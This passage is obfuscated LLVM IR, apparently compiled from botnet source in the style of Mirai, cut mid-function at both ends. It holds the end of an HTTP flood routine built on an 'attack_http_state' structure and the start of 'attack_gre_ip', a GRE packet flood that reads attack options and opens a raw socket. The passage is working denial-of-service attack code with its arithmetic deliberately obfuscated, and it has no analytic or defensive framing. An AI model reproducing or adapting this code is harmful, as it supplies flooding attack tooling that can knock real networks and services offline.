  %2442 = sub nsw i32 %2438, %2439
  %2443 = call i32 @util_memsearch(i8* %2435, i32 %2441, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0), i32 1)
  store i32 %2443, i32* %61, align 4
  %2444 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2445 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2444, i32 0, i32 18
  %2446 = load i32, i32* %60, align 4
  %2447 = load i32, i32* %61, align 4
  %2448 = add i32 %2447, -1297636631
  %2449 = sub i32 %2448, 1
  %2450 = sub i32 %2449, -1297636631
  %2451 = sub nsw i32 %2447, 1
  %2452 = sub i32 %2446, 1654458182
  %2453 = add i32 %2452, %2450
  %2454 = add i32 %2453, 1654458182
  %2455 = add nsw i32 %2446, %2450
  %2456 = sext i32 %2454 to i64
  %2457 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2445, i64 0, i64 %2456
  store i8 0, i8* %2457, align 1
  %2458 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2459 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2458, i32 0, i32 15
  %2460 = load i32, i32* %2459, align 4
  %2461 = icmp slt i32 %2460, 5
  br i1 %2461, label %2462, label %2574

; <label>:2462:                                   ; preds = %2422
  %2463 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2464 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2463, i32 0, i32 18
  %2465 = load i32, i32* %60, align 4
  %2466 = sext i32 %2465 to i64
  %2467 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2464, i64 0, i64 %2466
  %2468 = call i32 @util_strlen(i8* %2467)
  %2469 = icmp slt i32 %2468, 128
  br i1 %2469, label %2470, label %2574

; <label>:2470:                                   ; preds = %2462
  %2471 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2472 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2471, i32 0, i32 16
  %2473 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2474 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2473, i32 0, i32 15
  %2475 = load i32, i32* %2474, align 4
  %2476 = sext i32 %2475 to i64
  %2477 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2472, i64 0, i64 %2476
  %2478 = getelementptr inbounds [128 x i8], [128 x i8]* %2477, i32 0, i32 0
  %2479 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2480 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2479, i32 0, i32 18
  %2481 = load i32, i32* %60, align 4
  %2482 = sext i32 %2481 to i64
  %2483 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2480, i64 0, i64 %2482
  %2484 = call i32 @util_strcpy(i8* %2478, i8* %2483)
  %2485 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2486 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2485, i32 0, i32 16
  %2487 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2488 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2487, i32 0, i32 15
  %2489 = load i32, i32* %2488, align 4
  %2490 = sext i32 %2489 to i64
  %2491 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2486, i64 0, i64 %2490
  %2492 = getelementptr inbounds [128 x i8], [128 x i8]* %2491, i32 0, i32 0
  %2493 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2494 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2493, i32 0, i32 16
  %2495 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2496 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2495, i32 0, i32 15
  %2497 = load i32, i32* %2496, align 4
  %2498 = sext i32 %2497 to i64
  %2499 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2494, i64 0, i64 %2498
  %2500 = getelementptr inbounds [128 x i8], [128 x i8]* %2499, i32 0, i32 0
  %2501 = call i32 @util_strlen(i8* %2500)
  %2502 = sext i32 %2501 to i64
  %2503 = getelementptr inbounds i8, i8* %2492, i64 %2502
  %2504 = call i32 @util_strcpy(i8* %2503, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14, i32 0, i32 0))
  %2505 = load i32, i32* %61, align 4
  %2506 = sub i32 0, 3
  %2507 = sub i32 %2505, %2506
  %2508 = add nsw i32 %2505, 3
  %2509 = load i32, i32* %60, align 4
  %2510 = sub i32 %2509, 785211859
  %2511 = add i32 %2510, %2507
  %2512 = add i32 %2511, 785211859
  %2513 = add nsw i32 %2509, %2507
  store i32 %2512, i32* %60, align 4
  %2514 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2515 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2514, i32 0, i32 18
  %2516 = load i32, i32* %60, align 4
  %2517 = sext i32 %2516 to i64
  %2518 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2515, i64 0, i64 %2517
  %2519 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2520 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2519, i32 0, i32 17
  %2521 = load i32, i32* %2520, align 4
  %2522 = load i32, i32* %60, align 4
  %2523 = sub i32 %2521, -940504170
  %2524 = sub i32 %2523, %2522
  %2525 = add i32 %2524, -940504170
  %2526 = sub nsw i32 %2521, %2522
  %2527 = call i32 @util_memsearch(i8* %2518, i32 %2525, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0), i32 1)
  store i32 %2527, i32* %61, align 4
  %2528 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2529 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2528, i32 0, i32 18
  %2530 = load i32, i32* %60, align 4
  %2531 = load i32, i32* %61, align 4
  %2532 = sub i32 0, 1
  %2533 = add i32 %2531, %2532
  %2534 = sub nsw i32 %2531, 1
  %2535 = sub i32 %2530, -236189770
  %2536 = add i32 %2535, %2533
  %2537 = add i32 %2536, -236189770
  %2538 = add nsw i32 %2530, %2533
  %2539 = sext i32 %2537 to i64
  %2540 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2529, i64 0, i64 %2539
  store i8 0, i8* %2540, align 1
  %2541 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2542 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2541, i32 0, i32 16
  %2543 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2544 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2543, i32 0, i32 15
  %2545 = load i32, i32* %2544, align 4
  %2546 = sext i32 %2545 to i64
  %2547 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2542, i64 0, i64 %2546
  %2548 = getelementptr inbounds [128 x i8], [128 x i8]* %2547, i32 0, i32 0
  %2549 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2550 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2549, i32 0, i32 16
  %2551 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2552 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2551, i32 0, i32 15
  %2553 = load i32, i32* %2552, align 4
  %2554 = sext i32 %2553 to i64
  %2555 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2550, i64 0, i64 %2554
  %2556 = getelementptr inbounds [128 x i8], [128 x i8]* %2555, i32 0, i32 0
  %2557 = call i32 @util_strlen(i8* %2556)
  %2558 = sext i32 %2557 to i64
  %2559 = getelementptr inbounds i8, i8* %2548, i64 %2558
  %2560 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2561 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2560, i32 0, i32 18
  %2562 = load i32, i32* %60, align 4
  %2563 = sext i32 %2562 to i64
  %2564 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2561, i64 0, i64 %2563
  %2565 = call i32 @util_strcpy(i8* %2559, i8* %2564)
  %2566 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2567 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2566, i32 0, i32 15
  %2568 = load i32, i32* %2567, align 4
  %2569 = sub i32 0, %2568
  %2570 = sub i32 0, 1
  %2571 = add i32 %2569, %2570
  %2572 = sub i32 0, %2571
  %2573 = add nsw i32 %2568, 1
  store i32 %2572, i32* %2567, align 4
  br label %2574

; <label>:2574:                                   ; preds = %2470, %2462, %2422
  %2575 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2576 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2575, i32 0, i32 14
  store i32 -1, i32* %2576, align 4
  %2577 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2578 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2577, i32 0, i32 1
  store i8 10, i8* %2578, align 4
  br label %2711

; <label>:2579:                                   ; preds = %2412
  br label %2580

; <label>:2580:                                   ; preds = %2579, %2398
  br label %2581

; <label>:2581:                                   ; preds = %2580, %2377
  %2582 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2583 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2582, i32 0, i32 14
  %2584 = load i32, i32* %2583, align 4
  %2585 = icmp eq i32 %2584, 0
  br i1 %2585, label %2586, label %2672

; <label>:2586:                                   ; preds = %2581
  %2587 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2588 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2587, i32 0, i32 13
  %2589 = load i32, i32* %2588, align 4
  %2590 = icmp eq i32 %2589, 1
  br i1 %2590, label %2591, label %2652

; <label>:2591:                                   ; preds = %2586
  %2592 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2593 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2592, i32 0, i32 18
  %2594 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2593, i32 0, i32 0
  %2595 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2596 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2595, i32 0, i32 17
  %2597 = load i32, i32* %2596, align 4
  %2598 = call i32 @util_memsearch(i8* %2594, i32 %2597, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  %2599 = icmp ne i32 %2598, -1
  br i1 %2599, label %2600, label %2651

; <label>:2600:                                   ; preds = %2591
  %2601 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2602 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2601, i32 0, i32 18
  %2603 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2602, i32 0, i32 0
  %2604 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2605 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2604, i32 0, i32 17
  %2606 = load i32, i32* %2605, align 4
  %2607 = call i32 @util_memsearch(i8* %2603, i32 %2606, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %2607, i32* %62, align 4
  %2608 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2609 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2608, i32 0, i32 18
  %2610 = load i32, i32* %62, align 4
  %2611 = sub i32 0, 2
  %2612 = add i32 %2610, %2611
  %2613 = sub nsw i32 %2610, 2
  %2614 = sext i32 %2612 to i64
  %2615 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2609, i64 0, i64 %2614
  store i8 0, i8* %2615, align 1
  %2616 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2617 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2616, i32 0, i32 18
  %2618 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2617, i32 0, i32 0
  %2619 = load i32, i32* %62, align 4
  %2620 = call i32 @util_memsearch(i8* %2618, i32 %2619, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %2621 = icmp ne i32 %2620, -1
  br i1 %2621, label %2622, label %2632

; <label>:2622:                                   ; preds = %2600
  %2623 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2624 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2623, i32 0, i32 18
  %2625 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2626 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2625, i32 0, i32 18
  %2627 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2626, i32 0, i32 0
  %2628 = load i32, i32* %62, align 4
  %2629 = call i32 @util_memsearch(i8* %2627, i32 %2628, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %2630 = sext i32 %2629 to i64
  %2631 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2624, i64 0, i64 %2630
  store i8 0, i8* %2631, align 1
  br label %2632

; <label>:2632:                                   ; preds = %2622, %2600
  %2633 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2634 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2633, i32 0, i32 18
  %2635 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2634, i32 0, i32 0
  %2636 = call i32 @util_atoi(i8* %2635, i32 16)
  store i32 %2636, i32* %63, align 4
  %2637 = load i32, i32* %63, align 4
  %2638 = icmp eq i32 %2637, 0
  br i1 %2638, label %2639, label %2642

; <label>:2639:                                   ; preds = %2632
  %2640 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2641 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2640, i32 0, i32 1
  store i8 1, i8* %2641, align 4
  br label %2711

; <label>:2642:                                   ; preds = %2632
  %2643 = load i32, i32* %63, align 4
  %2644 = add i32 %2643, -752105129
  %2645 = add i32 %2644, 2
  %2646 = sub i32 %2645, -752105129
  %2647 = add nsw i32 %2643, 2
  %2648 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2649 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2648, i32 0, i32 14
  store i32 %2646, i32* %2649, align 4
  %2650 = load i32, i32* %62, align 4
  store i32 %2650, i32* %59, align 4
  br label %2651

; <label>:2651:                                   ; preds = %2642, %2591
  br label %2671

; <label>:2652:                                   ; preds = %2586
  %2653 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2654 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2653, i32 0, i32 17
  %2655 = load i32, i32* %2654, align 4
  %2656 = load i32, i32* %59, align 4
  %2657 = sub i32 %2655, -1611122043
  %2658 = sub i32 %2657, %2656
  %2659 = add i32 %2658, -1611122043
  %2660 = sub nsw i32 %2655, %2656
  %2661 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2662 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2661, i32 0, i32 14
  store i32 %2659, i32* %2662, align 4
  %2663 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2664 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2663, i32 0, i32 14
  %2665 = load i32, i32* %2664, align 4
  %2666 = icmp eq i32 %2665, 0
  br i1 %2666, label %2667, label %2670

; <label>:2667:                                   ; preds = %2652
  %2668 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2669 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2668, i32 0, i32 1
  store i8 1, i8* %2669, align 4
  br label %2711

; <label>:2670:                                   ; preds = %2652
  br label %2671

; <label>:2671:                                   ; preds = %2670, %2651
  br label %2672

; <label>:2672:                                   ; preds = %2671, %2581
  %2673 = load i32, i32* %59, align 4
  %2674 = icmp eq i32 %2673, 0
  br i1 %2674, label %2675, label %2676

; <label>:2675:                                   ; preds = %2672
  br label %2711

; <label>:2676:                                   ; preds = %2672
  %2677 = load i32, i32* %59, align 4
  %2678 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2679 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2678, i32 0, i32 17
  %2680 = load i32, i32* %2679, align 4
  %2681 = sub i32 0, %2677
  %2682 = add i32 %2680, %2681
  %2683 = sub nsw i32 %2680, %2677
  store i32 %2682, i32* %2679, align 4
  %2684 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2685 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2684, i32 0, i32 18
  %2686 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2685, i32 0, i32 0
  %2687 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2688 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2687, i32 0, i32 18
  %2689 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2688, i32 0, i32 0
  %2690 = load i32, i32* %59, align 4
  %2691 = sext i32 %2690 to i64
  %2692 = getelementptr inbounds i8, i8* %2689, i64 %2691
  %2693 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2694 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2693, i32 0, i32 17
  %2695 = load i32, i32* %2694, align 4
  %2696 = sext i32 %2695 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %2686, i8* %2692, i64 %2696, i32 1, i1 false)
  %2697 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2698 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2697, i32 0, i32 18
  %2699 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2700 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2699, i32 0, i32 17
  %2701 = load i32, i32* %2700, align 4
  %2702 = sext i32 %2701 to i64
  %2703 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2698, i64 0, i64 %2702
  store i8 0, i8* %2703, align 1
  %2704 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2705 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2704, i32 0, i32 17
  %2706 = load i32, i32* %2705, align 4
  %2707 = icmp eq i32 %2706, 0
  br i1 %2707, label %2708, label %2709

; <label>:2708:                                   ; preds = %2676
  br label %2711

; <label>:2709:                                   ; preds = %2676
  br label %2710

; <label>:2710:                                   ; preds = %2709
  br label %2377

; <label>:2711:                                   ; preds = %2708, %2675, %2667, %2639, %2574
  br label %2291

; <label>:2712:                                   ; preds = %2364, %2297
  br label %2765

; <label>:2713:                                   ; preds = %2284
  %2714 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2715 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2714, i32 0, i32 1
  %2716 = load i8, i8* %2715, align 4
  %2717 = zext i8 %2716 to i32
  %2718 = icmp eq i32 %2717, 10
  br i1 %2718, label %2719, label %2764

; <label>:2719:                                   ; preds = %2713
  br label %2720

; <label>:2720:                                   ; preds = %2753, %2719
  %2721 = call i32* @__errno_location() #7
  store i32 0, i32* %2721, align 4
  %2722 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2723 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2722, i32 0, i32 0
  %2724 = load i32, i32* %2723, align 4
  %2725 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2726 = call i64 @recv(i32 %2724, i8* %2725, i64 10240, i32 16384)
  %2727 = trunc i64 %2726 to i32
  store i32 %2727, i32* %12, align 4
  %2728 = load i32, i32* %12, align 4
  %2729 = icmp eq i32 %2728, 0
  br i1 %2729, label %2730, label %2732

; <label>:2730:                                   ; preds = %2720
  %2731 = call i32* @__errno_location() #7
  store i32 104, i32* %2731, align 4
  store i32 -1, i32* %12, align 4
  br label %2732

; <label>:2732:                                   ; preds = %2730, %2720
  %2733 = load i32, i32* %12, align 4
  %2734 = icmp eq i32 %2733, -1
  br i1 %2734, label %2735, label %2753

; <label>:2735:                                   ; preds = %2732
  %2736 = call i32* @__errno_location() #7
  %2737 = load i32, i32* %2736, align 4
  %2738 = icmp ne i32 %2737, 11
  br i1 %2738, label %2739, label %2752

; <label>:2739:                                   ; preds = %2735
  %2740 = call i32* @__errno_location() #7
  %2741 = load i32, i32* %2740, align 4
  %2742 = icmp ne i32 %2741, 11
  br i1 %2742, label %2743, label %2752

; <label>:2743:                                   ; preds = %2739
  %2744 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2745 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2744, i32 0, i32 0
  %2746 = load i32, i32* %2745, align 4
  %2747 = call i32 @close(i32 %2746)
  %2748 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2749 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2748, i32 0, i32 0
  store i32 -1, i32* %2749, align 4
  %2750 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2751 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2750, i32 0, i32 1
  store i8 0, i8* %2751, align 4
  br label %2752

; <label>:2752:                                   ; preds = %2743, %2739, %2735
  br label %2754

; <label>:2753:                                   ; preds = %2732
  br label %2720

; <label>:2754:                                   ; preds = %2752
  %2755 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2756 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2755, i32 0, i32 1
  %2757 = load i8, i8* %2756, align 4
  %2758 = zext i8 %2757 to i32
  %2759 = icmp ne i32 %2758, 0
  br i1 %2759, label %2760, label %2763

; <label>:2760:                                   ; preds = %2754
  %2761 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2762 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2761, i32 0, i32 1
  store i8 1, i8* %2762, align 4
  br label %2763

; <label>:2763:                                   ; preds = %2760, %2754
  br label %2764

; <label>:2764:                                   ; preds = %2763, %2713
  br label %2765

; <label>:2765:                                   ; preds = %2764, %2712
  br label %2766

; <label>:2766:                                   ; preds = %2765, %2275
  br label %2767

; <label>:2767:                                   ; preds = %2766, %1109
  br label %2768

; <label>:2768:                                   ; preds = %2767, %2235, %1841, %1161, %1144, %1099, %1060
  %2769 = load i32, i32* %9, align 4
  %2770 = sub i32 0, %2769
  %2771 = sub i32 0, 1
  %2772 = add i32 %2770, %2771
  %2773 = sub i32 0, %2772
  %2774 = add nsw i32 %2769, 1
  store i32 %2773, i32* %9, align 4
  br label %1047

; <label>:2775:                                   ; preds = %1047
  br label %363

; <label>:2776:                                   ; preds = %104, %99, %94, %89
  ret void
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

declare i32 @util_strlen(i8*) #3

declare i32 @util_strcpy(i8*, i8*) #3

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #2

; Function Attrs: nounwind
declare i64 @time(i64*) #1

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #2

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

declare void @util_zero(i8*, i32) #3

declare i8* @util_itoa(i32, i32, i8*) #3

declare signext i8 @util_strcmp(i8*, i8*) #3

declare i64 @send(i32, i8*, i64, i32) #3

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

declare i64 @recv(i32, i8*, i64, i32) #3

declare i32 @util_stristr(i8*, i32, i8*) #3

declare signext i8 @util_strncmp(i8*, i8*, i32) #3

declare i32 @sleep(i32) #3

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_ip(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.grehdr*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.udphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca %struct.iphdr*, align 8
  %31 = alloca %struct.grehdr*, align 8
  %32 = alloca %struct.iphdr*, align 8
  %33 = alloca %struct.udphdr*, align 8
  %34 = alloca i8*, align 8
  %35 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %36 = load i8, i8* %7, align 1
  %37 = zext i8 %36 to i64
  %38 = call noalias i8* @calloc(i64 %37, i64 8) #6
  %39 = bitcast i8* %38 to i8**
  store i8** %39, i8*** %13, align 8
  %40 = load i8, i8* %9, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 2, i32 0)
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %14, align 1
  %44 = load i8, i8* %9, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 3, i32 65535)
  %47 = trunc i32 %46 to i16
  store i16 %47, i16* %15, align 2
  %48 = load i8, i8* %9, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 4, i32 64)
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %16, align 1
  %52 = load i8, i8* %9, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 5, i32 1)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %17, align 1
  %56 = load i8, i8* %9, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 6, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %18, align 2
  %60 = load i8, i8* %9, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 7, i32 65535)
  %63 = trunc i32 %62 to i16
  store i16 %63, i16* %19, align 2
  %64 = load i8, i8* %9, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 0, i32 512)
  store i32 %66, i32* %20, align 4
  %67 = load i8, i8* %9, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %69 = call i32 @attack_get_opt_int(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 1, i32 1)
  %70 = trunc i32 %69 to i8
  store i8 %70, i8* %21, align 1
  %71 = load i8, i8* %9, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 18, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %22, align 1
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = load i32, i32* @LOCAL_ADDR, align 4
  %78 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 24, i32 %77)
  store i32 %78, i32* %23, align 4
  %79 = call i64 @time(i64* null) #6
  %80 = load i32, i32* %6, align 4
  %81 = sext i32 %80 to i64
  %82 = sub i64 0, %81
  %83 = sub i64 %79, %82
  %84 = add nsw i64 %79, %81
  %85 = trunc i64 %83 to i32
  store i32 %85, i32* %24, align 4
  %86 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %86, i32* %12, align 4
  %87 = icmp eq i32 %86, -1
  br i1 %87, label %88, label %89

; <label>:88:                                     ; preds = %5
  br label %557

; <label>:89:                                     ; preds = %5
